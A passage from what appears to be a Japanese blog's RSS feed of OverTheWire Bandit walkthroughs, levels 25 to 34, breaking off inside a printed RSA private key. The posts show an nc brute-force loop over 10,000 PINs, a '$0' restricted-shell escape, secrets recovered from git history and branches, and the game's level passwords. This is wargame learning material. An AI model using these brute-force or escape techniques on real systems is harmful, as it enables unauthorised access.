        <guid>https://tadakun8.github.io/post/over-the-wire/bandit/level33-34/</guid>
        <description>&lt;h2 id=&#34;level-33&#34;&gt;Level 33&lt;/h2&gt;
&lt;h3 id=&#34;goal&#34;&gt;Goal&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;After all this git stuff its time for another escape. Good luck!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;resolve&#34;&gt;resolve&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt;&amp;gt; $0
$ cat /etc/bandit_pass/bandit33
c9c3199ddf4121b10cf581a98d51caee
$ exit
&amp;gt;&amp;gt; ^C

# 以下はローカルで

&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;resolveまでにやったこと&#34;&gt;resolveまでにやったこと&lt;/h3&gt;
&lt;p&gt;まったくわからん&lt;/p&gt;
&lt;p&gt;全てのコマンドが大文字に変換されてしまうので、どうやってもコマンドを打つことができないです。ただ、やっていくうちに&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt;&amp;gt; $HOME
sh: 1: /home/bandit32: Permission denied
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;環境変数をそのまま打つと、その中身は小文字のままということがわかりました。おそらく何か変数用意し、その中で&lt;code&gt;/bin/bash&lt;/code&gt;を定義できればいいのと思われます。・・・がやはりできず。諦めて回答を見ることにしました。&lt;/p&gt;
&lt;p&gt;こちらのサイトを参考にしました。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://medium.com/secttp/overthewire-bandit-level-31-e3b82064285a&#34;&gt;https://medium.com/secttp/overthewire-bandit-level-31-e3b82064285a&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;これを見ると&lt;code&gt;$0&lt;/code&gt;でシェルを奪取できます。こんなに簡単だとは！&lt;/p&gt;
&lt;h3 id=&#34;0とは&#34;&gt;$0とは&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;$0&lt;/code&gt;とは起動中のシェルスクリプト名が定義されている変数のことです。以下の記事がわかりやすかったです。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://qiita.com/blueskyarea/items/b96c5b6cae02db4b9665&#34;&gt;https://qiita.com/blueskyarea/items/b96c5b6cae02db4b9665&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;$0&lt;/code&gt;は端末上では&lt;code&gt;/bin/bash&lt;/code&gt;が定義されており、シェルスクリプト内ではそのシェルスクリプトの名前が定義される変数です。例えば&lt;code&gt;./example.sh&lt;/code&gt;の中の&lt;code&gt;$0&lt;/code&gt;には&lt;code&gt;./example.sh&lt;/code&gt;が格納されます。&lt;/p&gt;
&lt;h2 id=&#34;level-34&#34;&gt;Level 34&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;At this moment, level 34 does not exist yet.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;banditはここでおわりみたいです。&lt;/p&gt;
&lt;h2 id=&#34;おわりに&#34;&gt;おわりに&lt;/h2&gt;
&lt;p&gt;bandit終了です！最後は自分の力で解きたかったのでそこが悔しかったです。banditをやってみて、Linuxコマンド全然知らないなぁと思うのと同時に、知っているコマンドもためになるオプションがあったりと自分の力になっているのを感じます。&lt;/p&gt;
&lt;p&gt;とりあえずやり遂げました！次は&lt;code&gt;Natas&lt;/code&gt;に挑戦します。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>【OverTheWire奮闘記】Bandit: Level31〜32</title>
        <link>https://tadakun8.github.io/post/over-the-wire/bandit/level31-32/</link>
        <pubDate>Wed, 30 Jun 2021 22:53:46 +0900</pubDate>
        
        <guid>https://tadakun8.github.io/post/over-the-wire/bandit/level31-32/</guid>
        <description>&lt;h2 id=&#34;level-31&#34;&gt;Level 31&lt;/h2&gt;
&lt;h3 id=&#34;goal&#34;&gt;Goal&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;There is a git repository at ssh://bandit30-git@localhost/home/bandit30-git/repo. The password for the user bandit30-git is the same as for the user bandit30.
Clone the repository and find the password for the next level.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;resolve&#34;&gt;resolve&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;bandit30@bandit:~$ mkdir /tmp/bandit31_clone
bandit30@bandit:~$ cd /tmp/bandit31_clone
bandit30@bandit:/tmp/bandit31_clone$ ls
bandit30@bandit:/tmp/bandit31_clone$ git clone ssh://bandit30-git@localhost/home/bandit30-git/repo
Cloning into &#39;repo&#39;...
Could not create directory &#39;/home/bandit30/.ssh&#39;.
The authenticity of host &#39;localhost (127.0.0.1)&#39; can&#39;t be established.
ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.
Are you sure you want to continue connecting (yes/no)? yes
Failed to add the host to the list of known hosts (/home/bandit30/.ssh/known_hosts).
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit30-git@localhost&#39;s password: 
remote: Counting objects: 4, done.
Receiving objects: 100% (4/4), done.
remote: Total 4 (delta 0), reused 0 (delta 0)
bandit30@bandit:/tmp/bandit31_clone$ ls
repo
bandit30@bandit:/tmp/bandit31_clone$ cd repo/
bandit30@bandit:/tmp/bandit31_clone/repo$ git tag
secret
bandit30@bandit:/tmp/bandit31_clone/repo$ git show secret
47e603bb428404d265f59c42920d81e5
bandit30@bandit:/tmp/bandit31_clone/repo$ exit

# 以下はローカルで
$ ssh -l bandit31 -p 2220 bandit.labs.overthewire.org
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit31@bandit.labs.overthewire.org&#39;s password: 47e603bb428404d265f59c42920d81e5
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;resolveまでにやったこと&#34;&gt;resolveまでにやったこと&lt;/h3&gt;
&lt;p&gt;ログも1つしかなく、ブランチもmasterしかなかったので、次は何だろうと考えました。&lt;/p&gt;
&lt;p&gt;考えて考えて、tagがまだあった！ということで&lt;code&gt;git tag&lt;/code&gt;してみると&lt;code&gt;secret&lt;/code&gt;というタグがありました。&lt;/p&gt;
&lt;p&gt;タグの情報は、&lt;code&gt;git show &amp;lt;tag name&amp;gt;&lt;/code&gt;で見れるようです。&lt;/p&gt;
&lt;h2 id=&#34;level-32&#34;&gt;Level 32&lt;/h2&gt;
&lt;h3 id=&#34;goal-1&#34;&gt;Goal&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;There is a git repository at ssh://bandit31-git@localhost/home/bandit31-git/repo. The password for the user bandit31-git is the same as for the user bandit31.
Clone the repository and find the password for the next level.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;resolve-1&#34;&gt;resolve&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;bandit31@bandit:~$ mkdir /tmp/bandit32_clone
bandit31@bandit:~$ cd /tmp/bandit32_clone
bandit31@bandit:/tmp/bandit32_clone$ git clone ssh://bandit31-git@localhost/home/bandit31-git/repo
Cloning into &#39;repo&#39;...
Could not create directory &#39;/home/bandit31/.ssh&#39;.
The authenticity of host &#39;localhost (127.0.0.1)&#39; can&#39;t be established.
ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.
Are you sure you want to continue connecting (yes/no)? yes
Failed to add the host to the list of known hosts (/home/bandit31/.ssh/known_hosts).
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit31-git@localhost&#39;s password: 
remote: Counting objects: 4, done.
remote: Compressing objects: 100% (3/3), done.
remote: Total 4 (delta 0), reused 0 (delta 0)
Receiving objects: 100% (4/4), done.
bandit31@bandit:/tmp/bandit32_clone$ cd repo/
bandit31@bandit:/tmp/bandit32_clone/repo$ rm -f .gitignore 
bandit31@bandit:/tmp/bandit32_clone/repo$ echo &amp;quot;May I come in?&amp;quot; &amp;gt; key.txt 
bandit31@bandit:/tmp/bandit32_clone/repo$ git add --all
bandit31@bandit:/tmp/bandit32_clone/repo$ git commit -m &#39;add key.txt&#39;
bandit31@bandit:/tmp/bandit32_clone/repo$ git push origin master
Could not create directory &#39;/home/bandit31/.ssh&#39;.
The authenticity of host &#39;localhost (127.0.0.1)&#39; can&#39;t be established.
ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.
Are you sure you want to continue connecting (yes/no)? yes
Failed to add the host to the list of known hosts (/home/bandit31/.ssh/known_hosts).
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit31-git@localhost&#39;s password: 47e603bb428404d265f59c42920d81e5
Counting objects: 3, done.
Delta compression using up to 2 threads.
Compressing objects: 100% (2/2), done.
Writing objects: 100% (3/3), 287 bytes | 0 bytes/s, done.
Total 3 (delta 0), reused 0 (delta 0)
remote: ### Attempting to validate files... ####
remote: 
remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.
remote: 
remote: Well done! Here is the password for the next level:
remote: 56a9bf19c63d650ce78e6ec0354ee45e
remote: 
remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.
remote: 
To ssh://localhost/home/bandit31-git/repo
 ! [remote rejected] master -&amp;gt; master (pre-receive hook declined)
error: failed to push some refs to &#39;ssh://bandit31-git@localhost/home/bandit31-git/repo&#39;
bandit31@bandit:/tmp/bandit32_clone/repo$ exit

# 以下はローカルで
$ ssh -l bandit32 -p 2220 bandit.labs.overthewire.org
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit32@bandit.labs.overthewire.org&#39;s password: 56a9bf19c63d650ce78e6ec0354ee45e
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;resolveまでにやったこと-1&#34;&gt;resolveまでにやったこと&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;bandit31@bandit:/tmp/bandit32_clone/repo$ ls -a
.  ..  .git  .gitignore  README.md
bandit31@bandit:/tmp/bandit32_clone/repo$ cat .gitignore 
*.txt
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;今回は&lt;code&gt;.gitignore&lt;/code&gt;があり、内容は拡張子が&lt;code&gt;.txt&lt;/code&gt;のファイルをignoreする設定みたいでした。&lt;/p&gt;
&lt;p&gt;次に&lt;code&gt;README.md&lt;/code&gt;を見てみると、今回のすることが書かれていました。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;bandit31@bandit:/tmp/bandit32_clone/repo$ cat README.md 
This time your task is to push a file to the remote repository.

Details:
    File name: key.txt
    Content: &#39;May I come in?&#39;
    Branch: master
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;key.txtをこの内容でpushするということですね。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;.txt&lt;/code&gt;は&lt;code&gt;.gitignore&lt;/code&gt;ではじかれているので、&lt;code&gt;.gitignore&lt;/code&gt;を消してから行い、pushするとパスワードを手に入れることができました。&lt;/p&gt;
&lt;h2 id=&#34;おしまい&#34;&gt;おしまい&lt;/h2&gt;
&lt;p&gt;gitのタグ付けについては改めて記事にしたいです。今のお仕事でタグはつけた方がいいと思っているのですが、どうしても後回しになってしまっています。知ることで心理的障壁をなくしたいです。&lt;/p&gt;
&lt;p&gt;また、Level32では、pushに失敗しているものの、パスワードは取得できているので意図した動作だと思います。おそらくgitのhookスクリプトで制御しているのだと思いますが、hookについても別で調べて記事にしたいです。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>【OverTheWire奮闘記】Bandit: Level28〜30</title>
        <link>https://tadakun8.github.io/post/over-the-wire/bandit/level28-30/</link>
        <pubDate>Tue, 29 Jun 2021 21:06:50 +0900</pubDate>
        
        <guid>https://tadakun8.github.io/post/over-the-wire/bandit/level28-30/</guid>
        <description>&lt;h2 id=&#34;level-28&#34;&gt;Level 28&lt;/h2&gt;
&lt;h3 id=&#34;goal&#34;&gt;Goal&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;There is a git repository at ssh://bandit27-git@localhost/home/bandit27-git/repo. The password for the user bandit27-git is the same as for the user bandit27.
Clone the repository and find the password for the next level.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;resolve&#34;&gt;resolve&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;bandit27@bandit:~$ mkdir /tmp/clone
bandit27@bandit:~$ cd /tmp/clone
bandit27@bandit:/tmp/clone$ git clone ssh://bandit27-git@localhost/home/bandit27-git/repo
Cloning into &#39;repo&#39;...
Could not create directory &#39;/home/bandit27/.ssh&#39;.
The authenticity of host &#39;localhost (127.0.0.1)&#39; can&#39;t be established.
ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.
Are you sure you want to continue connecting (yes/no)? yes
Failed to add the host to the list of known hosts (/home/bandit27/.ssh/known_hosts).
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit27-git@localhost&#39;s password: 3ba3118a22e93127a4ed485be72ef5ea
remote: Counting objects: 3, done.
remote: Compressing objects: 100% (2/2), done.
remote: Total 3 (delta 0), reused 0 (delta 0)
Receiving objects: 100% (3/3), done.
bandit27@bandit:/tmp/clone$ ls
repo
bandit27@bandit:/tmp/clone$ cd repo/
bandit27@bandit:/tmp/clone/repo$ cat README 
The password to the next level is: 0ef186ac70e04ea33b4c1853d2526fa2
bandit27@bandit:/tmp/clone/repo$ exit

# 以下はローカルで
$ ssh -l bandit28 -p 2220 bandit.labs.overthewire.org
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit28@bandit.labs.overthewire.org&#39;s password: 0ef186ac70e04ea33b4c1853d2526fa2
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;resolveまでにやったこと&#34;&gt;resolveまでにやったこと&lt;/h3&gt;
&lt;p&gt;強いて言うならcloneする場所で少し詰まったぐらいです。&lt;/p&gt;
&lt;p&gt;ホームディレクトリ直下でcloneすると&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;bandit27@bandit:~$ git clone ssh://bandit27-git@localhost/home/bandit27-git/repo
fatal: could not create work tree dir &#39;repo&#39;: Permission denied
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;このようにエラーが出ます。&lt;/p&gt;
&lt;p&gt;以下のサイトにも記載がありますが、&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://chico-shikaku.com/2020/06/git-could-not-create-work-tree-dir/&#34;&gt;https://chico-shikaku.com/2020/06/git-could-not-create-work-tree-dir/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;cloneするディレクトリに権限がないことで怒られています。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/tmp&lt;/code&gt;に適当なディレクトリを作成し、そこでcloneしたらいけました。&lt;/p&gt;
&lt;h2 id=&#34;level-29&#34;&gt;Level 29&lt;/h2&gt;
&lt;h3 id=&#34;goal-1&#34;&gt;Goal&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;There is a git repository at ssh://bandit28-git@localhost/home/bandit28-git/repo. The password for the user bandit28-git is the same as for the user bandit28.
Clone the repository and find the password for the next level.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;resolve-1&#34;&gt;resolve&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;bandit28@bandit:~$ mkdir /tmp/bandit28_clone
bandit28@bandit:~$ cd /tmp/bandit28_clone
bandit28@bandit:/tmp/bandit28_clone$ git clone ssh://bandit28-git@localhost/home/bandit28-git/repo
Cloning into &#39;repo&#39;...
Could not create directory &#39;/home/bandit28/.ssh&#39;.
The authenticity of host &#39;localhost (127.0.0.1)&#39; can&#39;t be established.
ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.
Are you sure you want to continue connecting (yes/no)? yes
Failed to add the host to the list of known hosts (/home/bandit28/.ssh/known_hosts).
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit28-git@localhost&#39;s password: 0ef186ac70e04ea33b4c1853d2526fa2
remote: Counting objects: 9, done.
remote: Compressing objects: 100% (6/6), done.
remote: Total 9 (delta 2), reused 0 (delta 0)
Receiving objects: 100% (9/9), 796 bytes | 0 bytes/s, done.
Resolving deltas: 100% (2/2), done.
bandit28@bandit:/tmp/bandit28_clone$ cd repo/
bandit28@bandit:/tmp/bandit28_clone/repo$ cat README.md 
# Bandit Notes
Some notes for level29 of bandit.

## credentials

- username: bandit29
- password: xxxxxxxxxx
bandit28@bandit:/tmp/bandit28_clone/repo$ git log
commit edd935d60906b33f0619605abd1689808ccdd5ee
Author: Morla Porla &amp;lt;morla@overthewire.org&amp;gt;
Date:   Thu May 7 20:14:49 2020 +0200

    fix info leak

commit c086d11a00c0648d095d04c089786efef5e01264
Author: Morla Porla &amp;lt;morla@overthewire.org&amp;gt;
Date:   Thu May 7 20:14:49 2020 +0200

    add missing data

commit de2ebe2d5fd1598cd547f4d56247e053be3fdc38
Author: Ben Dover &amp;lt;noone@overthewire.org&amp;gt;
Date:   Thu May 7 20:14:49 2020 +0200

    initial commit of README.md
bandit28@bandit:/tmp/bandit28_clone/repo$ git checkout c086d11a00c0648d095d04c089786efef5e01264
Note: checking out &#39;c086d11a00c0648d095d04c089786efef5e01264&#39;.

You are in &#39;detached HEAD&#39; state. You can look around, make experimental
changes and commit them, and you can discard any commits you make in this
state without impacting any branches by performing another checkout.

If you want to create a new branch to retain commits you create, you may
do so (now or later) by using -b with the checkout command again. Example:

  git checkout -b &amp;lt;new-branch-name&amp;gt;

HEAD is now at c086d11... add missing data
bandit28@bandit:/tmp/bandit28_clone/repo$ cat README.md 
# Bandit Notes
Some notes for level29 of bandit.

## credentials

- username: bandit29
- password: bbc96594b4e001778eee9975372716b2
bandit28@bandit:/tmp/bandit28_clone/repo$ exit

# 以下はローカルで
❯❯❯ ssh -l bandit29 -p 2220 bandit.labs.overthewire.org
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit29@bandit.labs.overthewire.org&#39;s password: bbc96594b4e001778eee9975372716b2
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;resolveまでにやったこと-1&#34;&gt;resolveまでにやったこと&lt;/h3&gt;
&lt;p&gt;cloneまではうまくいきましたが、&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;bandit28@bandit:/tmp/bandit28_clone/repo$ cat README.md 
# Bandit Notes
Some notes for level29 of bandit.

## credentials

- username: bandit29
- password: xxxxxxxxxx
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;passwordが隠されている！&lt;/p&gt;
&lt;p&gt;最初は&lt;code&gt;.git&lt;/code&gt;ディレクトリに隠してあるのかなぁと&lt;code&gt;cat&lt;/code&gt;おじさんしてました。&lt;/p&gt;
&lt;p&gt;そのとき、あー過去コミットにあるんじゃね？と&lt;code&gt;git log&lt;/code&gt;してみると&lt;code&gt;fix leak info&lt;/code&gt;というあぶなさが漂うコミットメッセージがありました。ここで修正しているということはその前のコミットにあると確信。そのコミットにcheckoutすると見事にありました。&lt;/p&gt;
&lt;h2 id=&#34;level-30&#34;&gt;Level 30&lt;/h2&gt;
&lt;h3 id=&#34;goal-2&#34;&gt;Goal&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;There is a git repository at ssh://bandit29-git@localhost/home/bandit29-git/repo. The password for the user bandit29-git is the same as for the user bandit29.
Clone the repository and find the password for the next level.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;resolve-2&#34;&gt;resolve&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;bandit29@bandit:~$ mkdir /tmp/bandit29_clone
bandit29@bandit:~$ cd /tmp/bandit29_clone
bandit29@bandit:/tmp/bandit29_clone$ git clone ssh://bandit29-git@localhost/home/bandit29-git/repo
Cloning into &#39;repo&#39;...
Could not create directory &#39;/home/bandit29/.ssh&#39;.
The authenticity of host &#39;localhost (127.0.0.1)&#39; can&#39;t be established.
ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.
Are you sure you want to continue connecting (yes/no)? yes
Failed to add the host to the list of known hosts (/home/bandit29/.ssh/known_hosts).
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit29-git@localhost&#39;s password: bbc96594b4e001778eee9975372716b2
remote: Counting objects: 16, done.
remote: Compressing objects: 100% (11/11), done.
remote: Total 16 (delta 2), reused 0 (delta 0)
Receiving objects: 100% (16/16), done.
Resolving deltas: 100% (2/2), done.
bandit29@bandit:/tmp/bandit29_clone$ cd repo/
bandit29@bandit:/tmp/bandit29_clone/repo$ cat README.md 
# Bandit Notes
Some notes for bandit30 of bandit.

## credentials

- username: bandit30
- password: &amp;lt;no passwords in production!&amp;gt;
bandit29@bandit:/tmp/bandit29_clone/repo$ git branch -a
* master
  remotes/origin/HEAD -&amp;gt; origin/master
  remotes/origin/dev
  remotes/origin/master
  remotes/origin/sploits-dev
bandit29@bandit:/tmp/bandit29_clone/repo$ git checkout -b dev origin/dev 
Branch dev set up to track remote branch dev from origin.
Switched to a new branch &#39;dev&#39;
bandit29@bandit:/tmp/bandit29_clone/repo$ cat README.md 
# Bandit Notes
Some notes for bandit30 of bandit.

## credentials

- username: bandit30
- password: 5b90576bedb2cc04c86a9e924ce42faf
bandit29@bandit:/tmp/bandit29_clone/repo$ exit

# 以下はローカルで
❯❯❯ ssh -l bandit30 -p 2220 bandit.labs.overthewire.org
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit30@bandit.labs.overthewire.org&#39;s password: 5b90576bedb2cc04c86a9e924ce42faf
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;resolveまでにやったこと-2&#34;&gt;resolveまでにやったこと&lt;/h3&gt;
&lt;p&gt;前のLevelが過去のコミットからパスワードを入手したから、次は違うブランチに隠してるんだろ！という気持ちのもと&lt;code&gt;git branch -a&lt;/code&gt;してみたら、案の定。いくつか新しいブランチがありました。&lt;/p&gt;
&lt;p&gt;そしてdevブランチにチェックアウトし見つけることができました。&lt;/p&gt;
&lt;p&gt;普段からgitの基本的なコマンドは使い慣れているので、詰まることはなかったです。&lt;/p&gt;
&lt;h2 id=&#34;おわりに&#34;&gt;おわりに&lt;/h2&gt;
&lt;p&gt;リポジトリに機密情報などは格納してはいけないというのが今回の教訓です。特にLevel19では、間違って機密情報をコミットしたものを修正しているようなログがありましたが、過去のコミットをさかのぼることで機密情報がわかってしまいます。OSSでこれをやるとアウトですね。&lt;/p&gt;
&lt;p&gt;間違えて機密情報をコミットしてしまったら、&lt;code&gt;git reset&lt;/code&gt;しましょう。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>【OverTheWire奮闘記】Bandit: Level25〜27</title>
        <link>https://tadakun8.github.io/post/over-the-wire/bandit/level25-27/</link>
        <pubDate>Mon, 28 Jun 2021 21:29:30 +0900</pubDate>
        
        <guid>https://tadakun8.github.io/post/over-the-wire/bandit/level25-27/</guid>
        <description>&lt;h2 id=&#34;level-25&#34;&gt;Level 25&lt;/h2&gt;
&lt;h3 id=&#34;goal&#34;&gt;Goal&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;デーモンがポート30002でlisten状態&lt;/li&gt;
&lt;li&gt;このポートにbandit24のパスワードと4桁のピンコードを与えるとbandit25のパスワードが手に入る&lt;/li&gt;
&lt;li&gt;ピンコードはブルートフォースでしか調べることはできない&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;resolve&#34;&gt;resolve&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;bandit24@bandit:~$ mkdir /tmp/shell
bandit24@bandit:~$ cd /tmp/shell
bandit24@bandit:/tmp/shell$ vim make-password-code.sh
#!/bin/bash

for i in {0000..9999};
do
    echo &amp;quot;UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ ${i}&amp;quot;
done
bandit24@bandit:/tmp/shell$ chmod +x make-password-code.sh 
bandit24@bandit:/tmp/shell$ ./make-password-code.sh &amp;gt; combinations.txt
bandit24@bandit:/tmp/shell$ nc localhost 30002 &amp;lt; combinations.txt 
.
.
.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Correct!
The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG

Exiting.
bandit24@bandit:/tmp/shell$ exit

# 以下はローカルで
$ ssh -l bandit25 -p 2220 bandit.labs.overthewire.org
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit25@bandit.labs.overthewire.org&#39;s password: uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;resolveまでにやったこと&#34;&gt;resolveまでにやったこと&lt;/h3&gt;
&lt;p&gt;ブルートフォースとは総当たり攻撃のことです。&lt;/p&gt;
&lt;p&gt;以下のシェルを作って対応しました&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#!/bin/bash

for count in {0000..9999};
do
    echo &amp;quot;UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ ${count}&amp;quot; | timeout -s 9 0.8 nc localhost 30002 &amp;gt;&amp;gt; result.txt
done
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;・・・ただ、&lt;strong&gt;とても遅い!&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;方法は合っていると思いますが、こんなにちんたらしたブルートフォース攻撃は捕まってしまいます笑。&lt;/p&gt;
&lt;p&gt;なので、先人たちの知恵を拝借しました。こちらのサイトが参考になりました。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://programmercave0.github.io/blog/2019/12/26/Bandit-Level-24-Level-25-OverTheWire&#34;&gt;https://programmercave0.github.io/blog/2019/12/26/Bandit-Level-24-Level-25-OverTheWire&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ぼくのやり方とほぼ同じでしたが、入力値を&lt;code&gt;echo&lt;/code&gt;ではなくファイルとして読み込んでいる点が異なる部分です。&lt;/p&gt;
&lt;p&gt;まず、以下のshell(make-password-code.sh)を作り&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#!/bin/bash
for i in {0000..9999}
do 
    echo &amp;quot;UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i&amp;quot;
done
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;その後、&lt;code&gt;./make-password-code.sh &amp;gt; combinations.txt&lt;/code&gt;で全ての組み合わせのファイルを作成してます。その後に&lt;code&gt;nc localhost 30002&lt;/code&gt;をしてパスワードを取得しています。&lt;/p&gt;
&lt;p&gt;私は最初、&lt;code&gt;nc&lt;/code&gt;を立ち上げて次の入力を行うにはSIGKILLを行うしか方法がないと思っていました。ただ、ファイルを読み込ませることで、ファイルの内容1行ずつ入力するということができると知りました！この方法だと一瞬でパスワードを取得できます。&lt;/p&gt;
&lt;h2 id=&#34;level-26&#34;&gt;Level 26&lt;/h2&gt;
&lt;h3 id=&#34;goal-1&#34;&gt;Goal&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Logging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not /bin/bash, but something else. Find out what it is, how it works and how to break out of it.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;bandit26へログインすることは簡単だが、/bin/bashではない&lt;/li&gt;
&lt;li&gt;それがどのように機能するのかを調べる&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;resolve-1&#34;&gt;resolve&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;bandit25@bandit:~$ cat bandit26.sshkey 
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEApis2AuoooEqeYWamtwX2k5z9uU1Afl2F8VyXQqbv/LTrIwdW
pTfaeRHXzr0Y0a5Oe3GB/+W2+PReif+bPZlzTY1XFwpk+DiHk1kmL0moEW8HJuT9
/5XbnpjSzn0eEAfFax2OcopjrzVqdBJQerkj0puv3UXY07AskgkyD5XepwGAlJOG
xZsMq1oZqQ0W29aBtfykuGie2bxroRjuAPrYM4o3MMmtlNE5fC4G9Ihq0eq73MDi
1ze6d2jIGce873qxn308BA2qhRPJNEbnPev5gI+5tU+UxebW8KLbk0EhoXB953Ix
3lgOIrT9Y6skRjsMSFmC6WN/O7ovu8QzGqxdywIDAQABAoIBAAaXoETtVT9GtpHW
qLaKHgYtLEO1tOFOhInWyolyZgL4inuRRva3CIvVEWK6TcnDyIlNL4MfcerehwGi
il4fQFvLR7E6UFcopvhJiSJHIcvPQ9FfNFR3dYcNOQ/IFvE73bEqMwSISPwiel6w
e1DjF3C7jHaS1s9PJfWFN982aublL/yLbJP+ou3ifdljS7QzjWZA8NRiMwmBGPIh
Yq8weR3jIVQl3ndEYxO7Cr/wXXebZwlP6CPZb67rBy0jg+366mxQbDZIwZYEaUME
zY5izFclr/kKj4s7NTRkC76Yx+rTNP5+BX+JT+rgz5aoQq8ghMw43NYwxjXym/MX
c8X8g0ECgYEA1crBUAR1gSkM+5mGjjoFLJKrFP+IhUHFh25qGI4Dcxxh1f3M53le
wF1rkp5SJnHRFm9IW3gM1JoF0PQxI5aXHRGHphwPeKnsQ/xQBRWCeYpqTme9amJV
